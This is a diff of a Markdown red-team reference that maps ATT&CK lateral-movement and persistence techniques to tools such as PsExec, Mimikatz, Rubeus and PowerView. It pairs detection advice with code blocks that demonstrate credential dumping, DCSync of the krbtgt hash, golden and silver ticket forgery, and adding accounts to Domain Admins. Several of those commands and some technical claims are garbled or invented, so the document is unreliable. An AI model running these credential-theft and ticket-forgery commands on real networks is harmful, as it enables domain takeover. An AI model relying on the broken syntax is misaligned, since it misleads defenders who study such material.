@@ -95,36 +95,103 @@ Attackers use several methods to move laterally, often blending in with authoriz
 * **Pass-the-Hash (T1550.002)**: Using stolen password hashes to authenticate, bypassing the need for a plaintext password.
 * **Exploitation of Remote Services (T1210)**: Exploiting vulnerabilities in network services to gain unauthorized access.
 * **Internal Spearphishing (T1534)**: Using a compromised internal account to send phishing emails to other employees within the same organization.
-* **Windows Admin Shares (T1021.002)*: Utilizing built-in network shares to copy files and move between systems. 
-### Common Usage Examples
+* **Windows Admin Shares [(T1021.002)](https://attack.mitre.org/techniques/T1021/002/)**: Utilizing built-in network shares to copy files and move between systems. 
+## Common Usage Examples
 * **RDP/VPN Hijacking**: An attacker uses stolen VPN credentials to log into a workstation, then uses RDP to move to a sensitive server.
-* **Using Admin Tools**: Utilizing Windows Management Instrumentation (WMI) or PowerShell Remoting to execute code on remote machines.
+* **Using Admin Tools**: Utilizing Windows Management Instrumentation (WMI) or PowerShell Remoting (PSR) to execute code on remote machines.
 * **Cloud Lateral Movement**: Accessing shared cloud resources by stealing API keys or leveraging misconfigured IAM roles to jump between cloud tenants. 
-### Imprtant Note About Lateral Movement
-This tactic is essential for threat actors to achieve their final objectives, such as stealing intellectual property, escalating privileges, or gaining persistence across an entire network. It is heavily used in approximately 60% of attacks, including ransomware campaigns. 
-* **Remote Services (T1021)**: Remote Services involve threat actors using legitimate credentials to move laterally within a network by abusing built-in administrative tools like RDP, SMB/Admin Shares, and WMI. By blending into normal administrative activity (living off the land), attackers can steal data, install malware, or pivot to new targets. 
-### Key Aspects of Remote Services Lateral Movement:
-* **SMB/Windows Admin Shares (T1021.002)**: Attackers leverage valid accounts to connect to default administrative shares (e.g., `C$`, `ADMIN$`) to copy malicious tools and move laterally.
-* **Remote Desktop Protocol (T1021.001)**: Attackers use RDP to log into systems interactively with a graphical user interface, often using stolen credentials, allowing them to act as a normal user.
-* **Windows Management Instrumentation (WMI) (T1021.003)**: Attackers use WMI to execute code remotely on other Windows systems, often used for stealthy command execution, bypassing standard monitoring.
+### Important Note About Lateral Movement
+* This tactic is essential for threat actors to achieve their final objectives, such as stealing intellectual property, escalating privileges, or gaining persistence across an entire network. It is heavily used in approximately 60% of attacks, including ransomware campaigns. 
+* **Remote Services [(T1021)](https://attack.mitre.org/techniques/T1021/)**: Remote Services involve threat actors using legitimate credentials to move laterally within a network by abusing built-in administrative tools like RDP, SMB/Admin Shares, and WMI. By blending into normal administrative activity (Living Off The Land), attackers can steal data, install malware, or pivot to new targets. 
+## Key Aspects of Remote Services Lateral Movement
+* **SMB/Windows Admin Shares [(T1021.002)](https://attack.mitre.org/techniques/T1021/002/)**: Attackers leverage valid accounts to connect to default administrative shares (e.g., `C$`, `ADMIN$`) to copy malicious tools and move laterally.
+* **Remote Desktop Protocol [(T1021.001)](https://attack.mitre.org/techniques/T1021/001/)**: Attackers use RDP to log into systems interactively with a graphical user interface, often using stolen credentials, allowing them to act as a normal user.
+* **Windows Management Instrumentation (WMI) [(T1021.003)](https://attack.mitre.org/techniques/T1021/003/)**: Attackers use WMI to execute code remotely on other Windows systems, often used for stealthy command execution, bypassing standard monitoring.
 * **Other Channels**: This technique also covers abuse of SSH, VNC, Windows Remote Management, and Cloud Services to access remote infrastructure. 
-### Detection and Mitigation Strategies:
+## Detection and Mitigation Strategies
 * **Monitor Activity**: Look for unusual logon activity, such as, for example, user accounts accessing multiple systems in a short time, or RDP/SMB activity outside of normal working hours.
 * **Restrict Access**: Use Windows Firewall to restrict SMB access, disable administrative shares if not needed, and restrict local administrator accounts to specific workstations.
 * **Credential Management**: Enforce strong, unique passwords for local admin accounts to prevent pass-the-hash attacks.
 * **TL;DR**: Using valid accounts to move laterally via SMB/Windows Admin Shares, Remote Desktop Protocol (RDP), or Windows Management Instrumentation (WMI).
 * **Pass-the-Hash (PtH) / Pass-the-Ticket (PtT)**: Utilizing stolen hashes or Kerberos tickets to impersonate users.
-### Tools
-* PsExec
-* WMIExec
-* RDP
+### Tool
+`PsExec`
+### Tool Description
+* `PsExec` is a lightweight command-line tool from Microsoft's Sysinternals suite that enables administrators to execute processes, scripts, and commands on remote Windows systems. It enables remote troubleshooting, software installation, and system management, such as running commands as the local SYSTEM account, without requiring manual client installation.
+## Key Capabilities and Uses
+* **Remote Command Execution**: Allows running tools and commands on a remote computer or multiple machines simultaneously using `psexec \\<computername>`.
+* **Interactive Sessions**: Enables opening a fully interactive command prompt (`cmd.exe`) on a remote system to run commands as if sitting at that machine.
+* **`SYSTEM` Privileges**: Supports running processes as the `SYSTEM` account (via the `-s` switch), which is useful for installing software or accessing restricted system files.
+* **File Transfer**: Can copy binaries to remote computers and execute them via `ADMIN$` share. 
+## How It Works:
+* `PsExec` connects to a target machine's `ADMIN$` share via SMB (TCP port 445), copies a temporary service executable (`PSEXESVC.exe`) to it, and uses that service to launch the requested command or process.
+* **Important Considerations**
+* **Security**: Due to its ability to remotely launch processes, it is commonly used by attackers for lateral movement, privilege escalation, and deploying malware during ransomware campaigns.
+* **Requirements**: Requires administrative credentials on the target machine, and the remote machine must have file and printer sharing enabled.
+* **Alternatives**: While popular, administrators may use more robust tools like PowerShell Remoting for large-scale deployments.
+### Tool
+WMIExec
+### Tool Description
+* WmIexec is a versatile Impacket tool used to execute commands and gain a semi-interactive shell on remote Windows systems. It leverages WMI and DCOM (TCP 135) for lateral movement and command execution without creating new services, making it stealthier than similar tools like `smbexec`.
+## Key Features and Behaviors
+* **Remote Command Execution**: Uses WMI (`Win32_Process` class) to execute commands (`cmd.exe /c`) remotely, often resulting in processes with `wmiprvse.exe` as the parent.
+* **Output Redirection**: It saves command output to a file via SMB (usually in ADMIN$) and deletes it afterward, which allows for viewing results of commands.
+* **Stealthy Operations**: It does not require installing a service on the target machine, which makes it harder to detect, note.
+* **Requirements**: Requires valid credentials (username and password or NTLM hash) of an account with local administrator privileges.
+* **Usage**: It is often used by red teams and threat actors to run commands, run PowerShell, or spawn reverse shells. 
+It is widely known as a powerful tool in the Impacket library, an open-source toolset that is used to work with network protocols.
+### Tool
+RDP (Remote Desktop Protocol)
+* The Remote Desktop Protocol (RDP) tool, developed by Microsoft, allows a user to remotely connect to, view, and control another computer over a network or internet connection. It provides a graphical interface, enabling users to operate a remote machine (like a desktop or server) as if they were physically sitting in front of it.
+## Key Functions of the RDP Tool
+* **Remote Access & Control**: Access a computer from a remote location, allowing for working from home, accessing files, or managing servers.
+* **Remote Troubleshooting**: IT personnel can connect to an employee's machine to diagnose or fix issues.
+* **File/Printer Sharing**: RDP supports resource redirection, such as printing from a remote machine to a local printer or accessing local files.
+* **Virtual Desktop Experience**: Provides a fully interactive desktop environment, including mouse and keyboard input.
+* **Clipboard Sharing**: Allows copying and pasting text or files between the local and remote computer.
+## Key Features and Properties
+* **Security**: RDP typically uses encryption to secure data transmission between the client and the server.
+* **Protocol Standards**: It is based on the T-120 family of protocols, utilizing a dedicated channel (usually port 3389) for data transfer.
+* **Multi-Platform Support**: While native to Windows, RDP clients exist for macOS, Linux, iOS, and Android.
+* **Bandwidth Efficiency**: It is designed to run efficiently over networks, reducing the need to retransmit screen data. 
+RDP is widely used in corporate environments for IT management, supporting remote work, and accessing cloud-based servers, although it requires secure configuration to avoid security risks.
 * BloodHound/SharpHound for path analysis
 
 ## Persistence (TA0003)
 Persistence is a core tactic within the MITRE ATT&CK framework, representing techniques that adversaries use to maintain access to a target system, even after disruptions such as consistent reboots, credential changes, or network interruptions. The ultimate goal of this tactic is to ensure long-term, continued presence on a compromised host to facilitate further malicious activity, such as data theft, espionage, or lateral movement. With over 20 distinct techniques categorized under it, persistence is crucial for threat actors because it allows them to retain a foothold even if their initial entry method is discovered and blocked.
-* **Account Manipulation (T1098)**: Modifying privileged groups, adding keys to `authorized_keys`, or manipulating user attributes.
-* **Tool**: Mimikatz
+# Persistence Attack Techniques and Tools
+## 1. Account Manipulation (T1098)
+### Attack Technique Details
+Account Manipulation (T1098) is a MITRE ATT&CK technique where adversaries modify existing, legitimate user or administrator accounts to maintain persistent access, escalate privileges, or evade detection. Unlike creating new accounts (T1136), which often triggers security alerts, manipulating existing accounts allows attackers to hide in plain sight using valid credentials.
+### 1. Modifying Privileged Groups (T1098.007) 
+* Attackers modify group memberships to elevate privileges from a standard user to an administrator or to gain access to sensitive resources.
+* **Windows**: Attackers use commands like `net localgroup "Administrators" [username] /add` or `net group "Domain Admins" [username] /add` to promote a compromised account.
+* **Linux**: Adversaries may add a user to the `sudo` or wheel groups using `usermod -aG sudo [username]` to obtain root-level privileges.
+* **Active Directory/Cloud**: Adding a user to the Domain Admins group or assigning high-level RBAC roles (e.g., Global Administrator in Office 365) ensures persistent, high-level access.
+### 2. Adding Keys to authorized_keys (T1098.004)
+* On Linux/macOS systems, attackers add their own SSH public keys to the .ssh/authorized_keys file of a user, allowing them to log in via SSH without a password. 
+* **Mechanism**: An attacker who gains shell access will append their public key to /home/[username]/.ssh/authorized_keys.
+* **Persistence**: Even if the attacker's original malicious process is killed, they can re-enter the system at any time using the corresponding private key, bypassing password-based security.
+* **Cloud Persistence**: In cloud environments, this can be done via CLI or API to modify SSH keys on virtual machine instances. 
+### 3. Manipulating User Attributes (T1098)
+* Adversaries tweak specific account attributes to bypass security policies or maintain access. 
+* **Password Policies**: Attackers may change passwords repeatedly to ensure the compromised account does not expire, or set a known password while bypassing password history requirements.
+* **Service Principal Names (SPN)**: Manipulating SPNs can facilitate Kerberoasting, a technique to crack service account passwords.
+* **MFA/Device Registration (T1098.005)**: Attackers may register a new device to a user account via Azure Entra ID or Duo self-enrollment portals to bypass Multi-Factor Authentication (MFA).
+* **Logon Hours**: Modifying allowed logon hours to allow access 24/7. 
+### 4. Cloud-Specific Manipulation (T1098.003)
+* **Additional Cloud Roles**: In AWS, an adversary may use AttachUserPolicy to attach an IAM policy with excessive permissions to a compromised account.
+* **OAuth Application Abuse**: Creating or modifying OAuth applications to gain long-term API access to user data (e.g., mailboxes) without needing user credentials. 
+## Detection and Mitigation
+* **Monitor Group Membership Changes**: Alert on unauthorized changes to sensitive groups like Domain Admins, Enterprise Admins, or `sudoers`.
+* **Audit `.ssh/authorized_keys`**: Use File Integrity Monitoring (FIM) to detect modifications to authorized_keys files.
+* **MFA Registration Monitoring**: Alert when new devices are registered for MFA, especially from anomalous locations.
+* **Audit Logging**: Enable detailed auditing for user account management, password resets, and login activity.
+* **TL;DR**: Modifying privileged groups, adding keys to `authorized_keys`, or manipulating user attributes.
+### Tool Used
+* Mimikatz
 * **Use for**: Password Dumping and Credential Manipulation
+### Password Dumping and Credential Manipulation Attack Technique Demonstration Using Mimikatz
 ```
 # Dump all user passwords from memory (Windows 10/11)
 mimikatz.exe "sekurlsa::logonPasswords"
@@ -138,8 +205,31 @@ mimikatz.exe "kerberos::ticket"
 # Use a stolen token to log in as another user
 mimikatz.exe "token::elevate" "token::dump /token" "privilege::debug" "token::runas /user:Administrator"
 ```
-* **Tool**: Rubeus
-* * **Use for**: Kerberos Ticket Attacks
+### Tool Used
+* Rubeus
+### Tool Description
+Rubeus is a specialized C# toolset designed for raw Kerberos interaction and abuse, primarily used in Windows Active Directory (AD) environments. It acts as an advanced credential extraction and manipulation tool, allowing attackers and red teams to interact directly with the Windows Kerberos client subsystem to bypass normal authentication, forge tickets, and perform lateral movement. Rubeus is frequently used to automate complex Kerberos ticket attacks, with its functionality heavily adapted from Benjamin Delpy’s Kekeo project.
+## Key Kerberos Ticket Attacks Supported by Rubeus 
+Rubeus supports a wide range of attack techniques, including: 
+* **Kerberoasting**: Rubeus automates the process of querying Active Directory for service accounts with Registered Service Principal Names (SPNs), requesting Ticket-Granting Service (TGS) tickets, and extracting them for offline password cracking.
+* **AS-REP Roasting**: It targets user accounts that have the "Do not require Kerberos preauthentication" option enabled. Rubeus requests AS-REP responses from the domain controller, which can then be subjected to offline brute-force attacks to retrieve plaintext passwords.
+* **Pass-the-Ticket (PtT)**: Rubeus can extract Ticket-Granting Tickets (TGTs) or service tickets from the memory of a compromised system (LSASS) and inject them into new sessions to move laterally without needing the user's password.
+* **Golden Ticket Forgery**: Rubeus can forge TGTs that grant permanent, unauthorized domain administrator access, assuming the attacker has obtained the Key Distribution Service (KDS) account hash.
+* **Silver Ticket Forgery**: It allows for the creation of fraudulent service tickets, giving attackers access to specific services (like CIFS or MSSQL) without requiring interaction with the domain controller.
+* **Diamond Tickets**: Rubeus is used in the creation of diamond tickets—a more modern, stealthier approach to ticket forgery that interacts with the KDC to create customized tickets. 
+## Key Features and Operational Advantages
+* **In-Memory Execution**: Rubeus is designed to operate entirely in memory, often avoiding file-based antivirus detection.
+* **No Administrative Rights Needed**: Unlike Mimikatz, which often requires local administrator privileges to interact with LSASS, Rubeus can perform many actions (like ticket requests) as a standard domain user.
+* **OPSEC Friendliness**: Rubeus can be configured to prevent caching tickets on the target host and can request only RC4-encrypted tickets, which are faster to crack, to reduce the time an attacker spends on the system.
+* **Targeting Ticket Encryption**: It supports extracting TGS tickets and formatting them directly for popular cracking tools such as Hashcat and John the Ripper.
+## Detection and Mitigation
+* Due to its power, security teams (Blue Teams) monitor for Rubeus activity through:
+* **Process Monitoring**: Detecting rubeus.exe or suspicious .NET assembly loads.
+* **Command Line Logging**: Monitoring for Rubeus-specific commands like asktgt, asktgs, kerberoast, or ptt.
+* **Active Directory Auditing**: Monitoring for abnormal TGT requests and auditing accounts with Kerberos preauthentication disabled.
+* **Note: Rubeus is commonly used by red teams and threat actors to exploit weak service account passwords, improper privilege assignments, and excessive delegation settings in AD environments.**
+* **Used for**: Kerberos Ticket Attacks
+### Kerberos Ticket Attack Technique Demonstration Using Rubeus
 ```
 # Request a TGT (Ticket Granting Ticket) with a username/password
 Rubeus.exe GetTGT /user:Administrator /password:Secretpass123
@@ -153,8 +243,22 @@ Rubeus.exe forge /ticket:... /user:Administrator /domain:domain.com
 # Use a Kerberos ticket to access a resource
 Rubeus.exe Kerberos::Ticket /ticket:... /s:target.com /dc:domain.com
 ```
-* **Tool**: PowerView
+### Tool Used
+* PowerView
+### Tool Description
+PowerView is a specialized PowerShell-based framework, originally part of PowerSploit, designed to perform Active Directory (AD) Enumeration and gain "network situational awareness" in Windows domain environments. It is heavily used by security professionals, penetration testers, and red teamers to map AD objects, identify misconfigurations, and facilitate post-exploitation activities without needing Remote Server Administration Tools (RSAT) installed.
+## Key Uses of PowerView for Active Directory Enumeration
+* PowerView automates the discovery of key AD components by replacing traditional Windows net commands with native PowerShell AD hooks and Win32 APIs.
+* **Domain & Object Mapping**: Enumerates users, groups, computers, and domain controllers.
+* **Permission & ACL Auditing**: Identifies weak Access Control Lists (ACLs) and Access Control Entries (ACEs) on objects, which often lead to privilege escalation paths.
+* **Trust Relationship Mapping**: Enumerates trusts between domains and forests (e.g., `Get-DomainTrust`, `Get-ForestTrust`).
+* **"User Hunting" (Lateral Movement)**: Finds where specific users are logged in across the network to identify high-value targets (e.g., `Invoke-UserHunter`).
+* **Local Admin Discovery**: Identifies machines on the network where the current user has local administrator rights (e.g., `Find-LocalAdminAccess`).
+* **GPO Analysis**: Enumerates Group Policy Objects (GPOs) to locate misconfigurations or credentials in scripts.
+### Common PowerView Commands
+* Most PowerView commands are designed to be piped together and often accept an array of hosts.
 * **Use for**: Active Directory Enumeration
+### Active Directory Enumeration Attack Technique Demonstration Using PowerView
 ```
 # Import PowerView module
 Import-Module PowerView
@@ -171,9 +275,28 @@ Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.
 # Enumerate processes and their owners (for lateral movement)
 Get-Process -ComputerName target.com | Select-Object ProcessName, Owner
 ```
-* **Golden/Silver Ticket Attacks (T1558)**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
-* **Tool**: Mimikatz - Golden & Silver Tickets
-* **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
+## Golden/Silver Ticket Attacks [(T1558)](https://attack.mitre.org/techniques/T1558/)
+### Attack Details
+A Golden Ticket is a critical post-exploitation technique used to forge Kerberos Ticket Granting Tickets (TGTs), granting individuals unlimited, near-undetectable, and persistent administrative access to an Active Directory (AD) domain. The attack is often executed using `mimikatz.exe` to extract the necessary cryptographic keys from a compromised Domain Controller (DC).
+* **Note**: It is called a "Golden Ticket" because it acts as a "master key" or VIP pass to the entire network, allowing an individual to impersonate any user, including domain administrators, without needing their actual password.
+## How a Golden Ticket Attack Works With Mimikatz
+The attack typically occurs in several steps, usually after an individual has already gained a foothold in the target network.
+### 1. Initial Compromise & Privilege Escalation
+An individual breaches the network via a post-Mimikatz attack method, such as phishing, and escalates privileges until they obtain any high-privilege or Domain Admin rights or direct access to a Domain Controller.
+### 2. `krbtgt` Hash Extraction
+An individual may use Mimikatz to dump the NTLM password hash of the `krbtgt` account - a built-in account that signs all Kerberos tickets - from the Active Directory database (`NTDS.dit`) or LSASS process memory using a command like `lsadump::DCSync /user:DOMAIN\krbtgt`
+### 3. Gathering Domain Information
+The individual collects information such as Domain SID (Security Identifier) and the Fully Qualified Domain Name (FQDN).
+### 4. Forging the Ticket
+Using the extracted hash, the individual uses `mimikatz.exe` to generate a forged TGT, often setting the privileges to Domain Admin and extending its validity for years. A common command used is `kerberos::golden /domain:<FQDN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt`
+### 5. Pass-the-Ticket (Injection)
+With the `/ptt` flag (Pass-the-Ticket), Mimikatz injects the forged ticket directly into the current session memory.
+### 6. Unrestricted Access
+The individual now has full, legitimate-appearing access to any services, such as file servers, and databases within the compromised domain.
+* * **TL;DR**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
+### Tool Used
+* Mimikatz
+* * **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
 ```
 # Step 1: Get krbtgt hash (requires SYSTEM privileges)  
 mimikatz.exe "lsa::dump /domain"  
@@ -187,7 +310,8 @@ mimikatz.exe "kerberos::ptt golden_ticket.kirbi"
 # Step 4: Use the ticket to access resources (e.g., log in as Administrator)  
 mimikatz.exe "ts::login /user:Administrator /domain:example.com"
 ```
-* **Tool**: Mimikatz
+### Tool Used
+* Mimikatz
 * **Use for**: Silver Ticket (Kerberos Service Ticket for Constrained Delegation)
 ```
 # Step 1: Get service account hash (e.g., from lsass or Kerberos ticket)  
@@ -202,7 +326,8 @@ mimikatz.exe "kerberos::ptt silver_ticket.kirbi"
 # Step 4: Use the ticket to access the service (e.g., HTTP)  
 mimikatz.exe "ts::login /user:serviceAccount /domain:example.com"
 ```
-* **Tool**: Rubeus - Golden & Silver Tickets
+### Tool Used
+* Rubeus - Golden & Silver Tickets
 * **Use for**: Golden Ticket (Kerberos TGT)
 ```
 # Step 1: Request a Golden Ticket (using domain credentials)  
@@ -214,7 +339,8 @@ Rubeus.exe ptt /ticket:golden_ticket.kirbi
 # Step 3: Access a resource with the impersonated ticket  
 Rubeus.exe kerberos::ticket /ticket:golden_ticket.kirbi /s:target.com
 ```
-* **Tool**: Rubeus
+### Tool Used
+* Rubeus
 * **Use for**: Silver Ticket (Kerberos Service Ticket)
 ```
 # Step 1: Request a Silver Ticket (using service account credentials)  
@@ -226,7 +352,8 @@ Rubeus.exe ptt /ticket:silver_ticket.kirbi
 # Step 3: Access the service (e.g., HTTP) with the ticket  
 Rubeus.exe kerberos::ticket /ticket:silver_ticket.kirbi /s:target.com
 ```
-* **Tool**: PowerView - Enumeration for Ticket Attacks
+### Tool Used
+* PowerView - Enumeration for Ticket Attacks
 * **Use for**: Golden Ticket (Identify Target for Impersonation)
 ```
 # Step 1: Enumerate domain users (including administrators)  
@@ -236,7 +363,8 @@ Get-User -Domain example.com | Where-Object { $_.UserAccountControl -band 167772
 # Step 2: Find service accounts or SPNs for Silver Ticket targets  
 Get-SPN -Domain example.com | Select-Object -ExpandProperty SPN  
 ```
-* **Tool**: PowerView
+### Tool Used
+* PowerView
 * **Use for**: Silver Ticket (Identify Service Targets)
 ```
 # Step 1: Enumerate all services (SPNs) in the domain  
@@ -245,12 +373,10 @@ Get-SPN -Domain example.com
 # Step 2: Find users with specific privileges (e.g., for Golden Ticket)  
 Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }  
 ```
-
-
 ---
 ## Privilege Escalation (TA0004)
 * **Abuse Elevation Control Mechanism (T1548)**: Leveraging UAC bypass, Token Manipulation, or misconfigured Access Control Lists (ACLs).
-### Tools
+### Tool
 * PowerUp
 * BloodHound
 
